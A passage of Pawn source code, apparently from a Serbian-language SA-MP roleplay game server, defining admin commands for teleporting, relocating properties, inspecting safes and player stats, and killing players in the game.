		    ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			SendInfoMessage( playerid, "Uspesno si kreirao kucu." );
			return 1;
}

CMD:ogetcar( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5  ) {

		new id, File[ 50 ];
		if( sscanf( params, "i", id ) ) {
			SendUsageMessage( playerid, "/ogetcar [ SciptID vozila ]");
			return 1;
	    }
	    
	    format( File, sizeof( File ), V_FILE, id );
		if( !fexist( File ) ) return SendErrorMessage( playerid, "To vozilo(ID) ne postoji u bazi podataka!");
	    
		new Float:plocx, Float:plocy, Float:plocz;
		GetPlayerPos( playerid, plocx, plocy, plocz );
		Novi_SetVehiclePos( VehicleInfo[ id ][ vID ], plocx, plocy+4, plocz );
		LinkVehicleToInterior( VehicleInfo[ id ][ vID ], GetPlayerInterior( playerid ) );
        SetVehicleVirtualWorld( VehicleInfo[ id ][ vID ], GetPlayerVirtualWorld( playerid ) );
		
		SendClientMessageEx( playerid, BELA, "Teleportovali ste vozilo ScriptID %d do sebe.", id );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:pomerilokaciju( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new Float:Pos[ 3 ], izbor, ID, File[ 50 ];

	if( sscanf( params, "ii", izbor, ID ) ) {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/pomerilokaciju [ izbor  ] [ id ]");
		SCM( playerid, BELA, "[Izbor] 1. imovina | 2. firma");
     	SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( izbor == 1 ) {
	    format( File, sizeof( File ), IM_FILE, ID );
		if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");
        GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
        II[ ID ][ iEnter ][ 0 ] = Pos[ 0 ];
		II[ ID ][ iEnter ][ 1 ] = Pos[ 1 ];
		II[ ID ][ iEnter ][ 2 ] = Pos[ 2 ];
		PropertyRefresh( ID );
		SaveProperty( ID );
		SendInfoMessage( playerid, "Uspesno ste prebacili lokaciju imovine ID: %d.", ID );
	}
	else if( izbor == 2 ) {
	    format( File, sizeof( File ), F_FILE, ID );
		if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");
        GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
        BussinesInfo[ ID ][ bEnterX ] = Pos[ 0 ];
		BussinesInfo[ ID ][ bEnterY ] = Pos[ 1 ];
		BussinesInfo[ ID ][ bEnterZ ] = Pos[ 2 ];
		Bussines_Refresh( ID );
		SaveBussines( ID );
		SendInfoMessage( playerid, "Uspesno ste prebacili lokaciju firme ID: %d.", ID );
	}
	else return SendErrorMessage( playerid, "Pogresan broj izabrane vrste." );
	return true;
}

CMD:proverifirmu( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
    
    new id, File[ 50 ];
    if( sscanf( params, "i",id ) ) return SendUsageMessage( playerid, "/proverifirmu [ ID firme ]");
    
    format( File, sizeof( File ), F_FILE, id );
    if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

    new string[256];
    format(string, sizeof(string), ""col_crvena"Ime Firme : "col_white"%s\n\n"col_crvena"Novac : "col_white"%d\n\n"col_crvena"Produkti : "col_white"%d/100", BussinesInfo[ id ][ bName ], BussinesInfo[ id ][ bMoney ], BussinesInfo[ id ][ bProducts ] );
    SPD( playerid, 0, DSMSG, D_NASLOV, string, D_ODABERI, D_ODUSTANI );

    return 1;
}

CMD:proveriorgsef( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
    
    new OrgID, File[ 50 ];
    if( sscanf( params, "i",OrgID ) ) return SendUsageMessage( playerid, "/proveriorgsef [ ID orge ]");
    
    format( File, sizeof( File ), O_FILE, OrgID );
    if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta organizacija(ID) ne postoji u bazi podataka!");

    new drug1 = OI[ OrgID ][ oSafeDrugCode ][ 0 ],
        drug2 = OI[ OrgID ][ oSafeDrugCode ][ 1 ],
        drug3 = OI[ OrgID ][ oSafeDrugCode ][ 2 ],
        drug4 = OI[ OrgID ][ oSafeDrugCode ][ 3 ];

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
    
    format( globalstring, sizeof( globalstring ), "Novac: %d$\n", OI[ OrgID ][ oSafeMoney ] );
    strcat( DialogStrgEx, globalstring );

    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
    
    format( globalstring, sizeof( globalstring ), "Materijali: %d\n", OI[ OrgID ][ oMaterijali ] );
    strcat( DialogStrgEx, globalstring );
    
    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
    format( globalstring, sizeof( globalstring ), "Drug1: %s(%d g) | Drug2: %s(%d g)\n", GetDrugNameByDrugID(drug1), OI[ OrgID ][ oSafeDrug ][ 0 ], GetDrugNameByDrugID(drug2), OI[ OrgID ][ oSafeDrug ][ 1 ] );
    strcat( DialogStrgEx, globalstring );

    format( globalstring, sizeof( globalstring ), "Drug3: %s(%d g) | Drug4: %s(%d g)\n", GetDrugNameByDrugID(drug3), OI[ OrgID ][ oSafeDrug ][ 2 ], GetDrugNameByDrugID(drug4), OI[ OrgID ][ oSafeDrug ][ 3 ] );
    strcat( DialogStrgEx, globalstring );
    
    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
    SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

    return 1;
}

CMD:proveriimovinu( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
    
	new id, File[ 50 ];
	if( sscanf( params, "i",id ) ) return SendUsageMessage( playerid, "/proveriimovinu [ ID imovine ]");
	
	format( File, sizeof( File ), IM_FILE, id );
	if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");


    new wepname1[ 32 ], wepname2[ 32 ], wepname3[ 32 ], wepname4[ 32 ];

	new drug1 = II[ id ][ iDrugCode ][ 0 ],
	drug2 = II[ id ][ iDrugCode ][ 1 ],
	drug3 = II[ id ][ iDrugCode ][ 2 ],
	drug4 = II[ id ][ iDrugCode ][ 3 ],
	drug5 = II[ id ][ iDrugCode ][ 4 ],
	drug6 = II[ id ][ iDrugCode ][ 5 ],
	drug7 = II[ id ][ iDrugCode ][ 6 ],
	drug8 = II[ id ][ iDrugCode ][ 7 ],
	drug9 = II[ id ][ iDrugCode ][ 8 ],
	drug10 = II[ id ][ iDrugCode ][ 9 ];

	if( II[ id ][ iOruzje ][ 0 ] != 0)
		format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 0 ] ] );
	else
		strmid(wepname1, "None", 0, 5);

	if( II[ id ][ iOruzje ][ 1 ] != 0)
		format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 1 ] ] );
	else
		strmid(wepname2, "None", 0, 5);

	if( II[ id ][ iOruzje ][ 2 ] != 0)
		format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 2 ] ] );
	else
		strmid(wepname3, "None", 0, 5);

	if( II[ id ][ iOruzje ][ 3 ] != 0)
		format( wepname4, sizeof( wepname4 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 3 ] ] );
	else
		strmid(wepname4, "None", 0, 5);


	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	
	format( globalstring, sizeof( globalstring ), ""col_white"Novac: %d$\n\n", II[ id ][ iMoney ] );
	strcat( DialogStrgEx, globalstring );
	
	strcat( DialogStrgEx, ""col_crvena"______________ORUZJE______________\n" );
	
	format( globalstring, sizeof( globalstring ), ""col_white"Slot 1: %s(%d g) | Slot 2: %s(%d g)\n", GetDrugNameByDrugID(drug1), II[ id ][ iDrug ][ 0 ], GetDrugNameByDrugID(drug2), II[ id ][ iDrug ][ 1 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "Slot 3: %s(%d g) | Slot 4: %s(%d g)\n", GetDrugNameByDrugID(drug3), II[ id ][ iDrug ][ 2 ], GetDrugNameByDrugID(drug4), II[ id ][ iDrug ][ 3 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "Slot 5: %s(%d g) | Slot 6: %s(%d g)\n", GetDrugNameByDrugID(drug5), II[ id ][ iDrug ][ 4 ], GetDrugNameByDrugID(drug6), II[ id ][ iDrug ][ 5 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "Slot 7: %s(%d g) | Slot 8: %s(%d g)\n", GetDrugNameByDrugID(drug7), II[ id ][ iDrug ][ 6 ], GetDrugNameByDrugID(drug8), II[ id ][ iDrug ][ 7 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "Slot 9: %s(%d g) | Slot 10: %s(%d g)\n\n", GetDrugNameByDrugID(drug9), II[ id ][ iDrug ][ 8 ], GetDrugNameByDrugID(drug10), II[ id ][ iDrug ][ 9 ] );
	strcat( DialogStrgEx, globalstring );

	strcat( DialogStrgEx, ""col_crvena"______________DROGA______________\n" );

	format( globalstring, sizeof( globalstring ), ""col_white"Slot 1:[%s]    |    Metaka: %d\n", wepname1, II[ id ][ iMunicija ][ 0 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "Slot 2:[%s]    |    Metaka: %d\n", wepname2, II[ id ][ iMunicija ][ 1 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "Slot 3:[%s]    |    Metaka: %d\n", wepname3, II[ id ][ iMunicija ][ 2 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "Slot 4:[%s]    |    Metaka: %d", wepname4, II[ id ][ iMunicija ][ 3 ] );
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "ID: %d | Vlasnik %s", id, II[ id ][ iOwner ] );

	SPD( playerid, 0, DSMSG, globalstring, DialogStrgEx, "Potvrdi", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}

CMD:oport( playerid, params[] ) {
	new Float:Pos[ 3 ],odabir[ 20 ], id, File[ 50 ];
	if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	if( sscanf( params, "s[20]i", odabir, id ) ) {
		SendUsageMessage( playerid, "/oport [ ime ] [ ID ]");
		SCM(playerid, BELA, "Dostupno: imovina, firma, vozilo, organizacija, hotel, imanje, garaza");
		SCM(playerid, BELA, "Dostupno: kontejner, radionica, bitcoin, platforma");
		return true;
	}
	else {
        if(strcmp(odabir,"platforma",true) == 0) {
            format( File, sizeof( File ), PLATFORMA_FILE, id );
            if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta platforma(ID) ne postoji u bazi podataka!");
            Novi_SetPlayerPos( playerid, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazX]);
            SetPlayerInterior( playerid,0 );
            SetPlayerVirtualWorld( playerid,0 );
            SendClientMessageEx( playerid, BELA, "Teleportovali ste se do platforme ID %d",id);
        }
        if(strcmp(odabir,"bitcoin",true) == 0) {
            format( File, sizeof( File ), BITCOIN_FILE, id );
            if( !fexist( File ) ) return SendErrorMessage( playerid, "Taj bitcoin workshop(ID) ne postoji u bazi podataka!");
            Novi_SetPlayerPos( playerid, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ]);
            SetPlayerInterior( playerid,0 );
            SetPlayerVirtualWorld( playerid,0 );
            SendClientMessageEx( playerid, BELA, "Teleportovali ste se do bitcoin workshopa ID %d",id);
        }
        if(strcmp(odabir,"radionica",true) == 0) {
            format( File, sizeof( File ), WorkShop_File, id );
            if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta radionica(ID) ne postoji u bazi podataka!");
            Novi_SetPlayerPos( playerid, WorkShopInfo[id][wPosX], WorkShopInfo[id][wPosY], WorkShopInfo[id][wPosZ]);
            SetPlayerInterior( playerid,0 );
            SetPlayerVirtualWorld( playerid,0 );
            SendClientMessageEx( playerid, BELA, "Teleportovali ste se do radionice ID %d",id);
        }
		if(strcmp(odabir,"imovina",true) == 0) {
			format( File, sizeof( File ), IM_FILE, id );
			if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");
		    Novi_SetPlayerPos( playerid, II[ id ][ iEnter ][ 0 ], II[ id ][ iEnter ][ 1 ], II[ id ][ iEnter ][ 2 ] );
		    SetPlayerInterior( playerid,0 );
			SetPlayerVirtualWorld( playerid,0 );
			SendClientMessageEx( playerid, BELA, "Teleportovali ste se do kuce ID %d",id);
		}
		if(strcmp(odabir,"firma",true) == 0) {
			format( File, sizeof( File ), F_FILE, id );
			if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");
		    Novi_SetPlayerPos( playerid, BussinesInfo[ id ][ bEnterX ], BussinesInfo[ id ][ bEnterY ], BussinesInfo[ id ][ bEnterZ ] );
		   	SetPlayerInterior( playerid,0 );
			SetPlayerVirtualWorld( playerid,0 );
			SendClientMessageEx( playerid, BELA, "Teleportovali ste se do firme ID %d", id);
		}
        if(strcmp(odabir,"vozilo",true) == 0) {
			format( File, sizeof( File ), V_FILE, id );
			if( !fexist( File ) ) return SendErrorMessage( playerid, "To vozilo(ID) ne postoji u bazi podataka!");
			GetVehiclePos( VehicleInfo[ id ][ vID ], Pos[0], Pos[1], Pos[2] );
		    Novi_SetPlayerPos( playerid, Pos[0], Pos[1], Pos[2]+3 );
		   	SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			SendClientMessageEx( playerid, BELA, "Teleportovali ste se do vozila ID %d", id);
		}
		if(strcmp(odabir,"organizacija",true) == 0) {
			format( File, sizeof( File ), O_FILE, id );
			if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta organizacija(ID) ne postoji u bazi podataka!");
		    Novi_SetPlayerPos( playerid, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ] );
		   	SetPlayerInterior( playerid,0 );
			SetPlayerVirtualWorld( playerid,0 );
			SendClientMessageEx( playerid, BELA, "Teleportovali ste se do organizacije ID %d", id);
		}
		if(strcmp(odabir,"hotel",true) == 0) {
			format( File, sizeof( File ), HOTEL_FILE, id );
			if( !fexist( File ) ) return SendErrorMessage( playerid, "Taj hotel(ID) ne postoji u bazi podataka!");
		    Novi_SetPlayerPos( playerid, hotelInfo[ id ][ hEnter ][ 0 ], hotelInfo[ id ][ hEnter ][ 1 ], hotelInfo[ id ][ hEnter ][ 2 ] );
		   	SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			SendClientMessageEx( playerid, BELA, "Teleportovali ste se do hotela ID %d", id);
		}
		if(strcmp(odabir,"garaza",true) == 0) {
			format( File, sizeof( File ), F_GARAGE, id );
			if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta garaza(ID) ne postoji u bazi podataka!");
		    Novi_SetPlayerPos( playerid, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ] );
		   	SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			SendClientMessageEx( playerid, BELA, "Teleportovali ste se do garaze ID %d", id);
		}
		if(strcmp(odabir,"kontejner",true) == 0) {
			format( File, sizeof( File ), KO_FILE, id );
			if( !fexist( File ) ) return SendErrorMessage( playerid, "Taj kontejner(ID) ne postoji u bazi podataka!");
		    Novi_SetPlayerPos( playerid, KontInfo[ id ][ koObjPos ][ 0 ]+2, KontInfo[ id ][ koObjPos ][ 1 ], KontInfo[ id ][ koObjPos ][ 2 ] );
		   	SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			SendClientMessageEx( playerid, BELA, "Teleportovali ste se do kontejnera ID %d", id);
		}
	}
	return true;
}

CMD:lp( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
		//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		for( new i = 1; i < MAX_ASKQS; i++ ) {
			format( DialogStrgEx, sizeof( DialogStrgEx ), "%sPitanje %d - %s(%d)\n", DialogStrgEx, i, askqList[ i ][ askqOwner ], askqList[ i ][ askqID ] );
		}
		SPD( playerid, dialog_ASKLISTA, DSL, D_NASLOV, DialogStrgEx, D_ODABERI, D_ODUSTANI );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

// CMD:aport( playerid, params[] ) {
//     if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
// 		//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
//         if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) {
//             if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
// 			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
// 			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
// 		}
// 		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
// 		for( new i = 0; i < MAX_APORTS; i++ ) {
// 			if( aportInfo[ i ][ aportCreated ] == 1 ) {
// 				format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, aportInfo[ i ][ aportName ] );
// 			}
// 		}
// 		SPD( playerid, dialog_SELECTAPORT, DSL, D_NASLOV, DialogStrgEx, D_ODABERI, D_ODUSTANI );
// 	}
// 	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
//     return true;
// }

// CMD:hport( playerid, params[] ) {
//     if(  PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
// 		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti supp na duznosti." );
//         if( PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
//             if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
//             if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
// 			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
// 			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
// 		}
// 		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
// 		for( new i = 0; i < MAX_SPORTS; i++ ) {
// 			if( supportInfo[ i ][ supportCreated ] == 1 ) {
// 				format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, supportInfo[ i ][ supportName ] );
// 			}
// 		}
// 		SPD( playerid, dialog_SELECTSPORT, DSL, D_NASLOV, DialogStrgEx, D_ODABERI, D_ODUSTANI );
// 	}
// 	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
//     return true;
// }

CMD:mark( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		GetPlayerPos( playerid, PlayerInfo[ playerid ][ xMarker ][ 0 ], PlayerInfo[ playerid ][ xMarker ][ 1 ], PlayerInfo[ playerid ][ xMarker ][ 2 ] );
		SendInfoMessage( playerid, "Sacuvao si poziciju za teleportovanje(/gotomark)!");
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

CMD:gotomark( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		if( GetPlayerState( playerid ) == 2 ) {
			Novi_SetVehiclePos( GetPlayerVehicleID( playerid ), PlayerInfo[ playerid ][ xMarker ][ 0 ], PlayerInfo[ playerid ][ xMarker ][ 1 ], PlayerInfo[ playerid ][ xMarker ][ 2 ] );
	        SendInfoMessage( playerid, "Teleportirani ste na oznakenu poziciju");
			SetPlayerInterior( playerid, 0 ); SetPlayerVirtualWorld( playerid, 0 );
		}
		else {
			Novi_SetPlayerPos( playerid, PlayerInfo[ playerid ][ xMarker ][ 0 ], PlayerInfo[ playerid ][ xMarker ][ 1 ], PlayerInfo[ playerid ][ xMarker ][ 2 ] );
			SendInfoMessage( playerid, "Teleportirani ste na oznakenu poziciju");
			SetPlayerInterior( playerid, 0 ); SetPlayerVirtualWorld( playerid, 0 );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

CMD:proveri( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSpecAdmin] == 1) {
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/proveri [ ID/Deo imena ]" );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozete to suvlasniku i owneru!" );
		if(PlayerInfo[playerid][xSpecAdmin] == 1 && PlayerInfo[id][xAdmin] >= 1) return SendErrorMessage( playerid, "Ne mozete njega!" );
		ShowDialogStatsCheck( playerid, id );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

CMD:aktivnostigraca( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {

		new imeigraca[24], ifile[ 64 ];
		if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/aktivnostigraca [ Ime_Prezime ]" );
		format( ifile, sizeof( ifile ), I_FILE, imeigraca );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da proveri ga online.");
			return 1;
		}
		INI_ParseFile( ifile, "ShowOffStats" );

        new banfile[ 100 ]; new razlogbana[ 128 ] = "Nepoznat";
        new banan[ 10 ] = "Ne";
		format( banfile, sizeof( banfile ), FILE_BAN, imeigraca );
		if( fexist( banfile ) ) {
			format( banan, sizeof( banan ), "Da" );
			new File: UserFile = fopen( banfile, io_read );
			new key[256];
			new Data[256];
			while ( fread( UserFile , Data, sizeof( Data ) ) ) {
				key = ini_GetKey( Data );
				if( strcmp( key , "Razlog" , true ) == 0 ) {
				    format( razlogbana, strlen( ini_GetValue ( Data ) ), "%s", ini_GetValue( Data ) );
				}
			}
			fclose( UserFile );
		}
		else {
		    format( banan, sizeof( banan ), "Ne" );
		}


        new pol[ 7 ];
		if( PlayerInfo[ playerid ][ xPol ] == 1 ) pol = "musko";
		else if( PlayerInfo[ playerid ][ xPol ] == 2 ) pol = "zensko";

		new nxtlevel = OfflineCheck[ Level ]+1,
		    expamount = nxtlevel*levelexp,
		    warns = OfflineCheck[ Upozorenja ],
		    level = OfflineCheck[ Level ],
			exp = OfflineCheck[ Respekt ];

        SendClientMessage(playerid, 0x5BD3FFAA,"_________________________________________________");
		format( globalstring, sizeof( globalstring ),"*** %s ***", imeigraca );
		SendClientMessage(playerid, SRVBOJA1,globalstring);
		format( globalstring, sizeof( globalstring ), "Pol [%s] | Level:[%d] | Sati Igranja:[%d]", pol, level, OfflineCheck[ OnlineSati ] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Respekt:[%d/%d] | Novac: [%d$] | Banka: [%d$]", exp, expamount, OfflineCheck[ Novac ], OfflineCheck[ Banka ] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Upozorenja: [%d/3] | Posao: [%s] | Posao ugovor: [%d/5]", warns, getJobName( OfflineCheck[ Posao ] ), OfflineCheck[ Posaougovor ] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Godine: [%d] | Organizacija: [%s] | Rank: [%d]", OfflineCheck[ Godine ], getOrgName( OfflineCheck[ Organizacija ] ), OfflineCheck[ Rank ] );
		SendClientMessage(playerid, 0xFFFFFFAA,globalstring);
		format( globalstring, sizeof( globalstring ), "Kljuc Imovine1 [%d] | Kljuc Imovine2 [%d] | Kljuc Imovine3 [%d]", OfflineCheck[ Imovina1 ], OfflineCheck[ Imovina2 ], OfflineCheck[ Imovina3 ] );
		SendClientMessage(playerid, 0xF0F0F0FF,globalstring);
		format( globalstring, sizeof( globalstring ), "Kljuc Firme [%d] | Kljuc Vozila1 [%d] | Kljuc Vozila2 [%d]", OfflineCheck[ Firma ], OfflineCheck[ Vozilo1 ], OfflineCheck[ Vozilo2 ] );
		SendClientMessage(playerid, 0xF0F0F0FF,globalstring);
		format( globalstring, sizeof( globalstring ), "Kljuc Vozila3 [%d] | Kljuc Vozila4 [%d]", OfflineCheck[ Vozilo3 ], OfflineCheck[ Vozilo4 ] );
		SendClientMessage( playerid, 0xF0F0F0FF,globalstring );
        format( globalstring, sizeof( globalstring ), "Kljuc hotela [%d] | Admin [%d] | Helper [%d]", OfflineCheck[ Hotel ], OfflineCheck[ Admin ], OfflineCheck[ GameSage ] );
		SendClientMessage( playerid, 0xF0F0F0FF,globalstring );
		format( globalstring, sizeof( globalstring ), "Aktivnost igraca u staff timu: %d minuta", OfflineCheck[ StaffMin ] );
		SendClientMessage( playerid, 0xF0F0F0FF,globalstring );
		format( globalstring, sizeof( globalstring ), "Banovan: %s | Razlog: %s", banan, razlogbana );
		SendClientMessage( playerid, 0xF0F0F0FF,globalstring );
        format( globalstring, sizeof( globalstring ), "Zadnja aktivnost: %s", OfflineCheck[ LastLogin ] );
		SendClientMessage( playerid, 0xF0F0F0FF,globalstring );
		SendClientMessage( playerid, 0x5BD3FFAA,"_________________________________________________");

    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

alias:kill("ubij");
CMD:kill( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 3 ) {
        // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/ubij [ ID/Deo imena ]." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozete to suvlasniku i owneru!" );
		Novi_SetPlayerHealth( id, 0 );
	   	format( globalstring, sizeof( globalstring ), "|A| %s ubijen si od Admin-a %s", ImeIgraca( id ), ImeIgraca( playerid ));
		SCM( id, ANTICHEAT, globalstring );
	   	format( globalstring, sizeof( globalstring ), "|A|Ubijen| %s je ubijen od Admin-a %s", ImeIgraca( id ), ImeIgraca( playerid ));
		AdminPoruka( 0x9ACD32AA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:spawn( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {
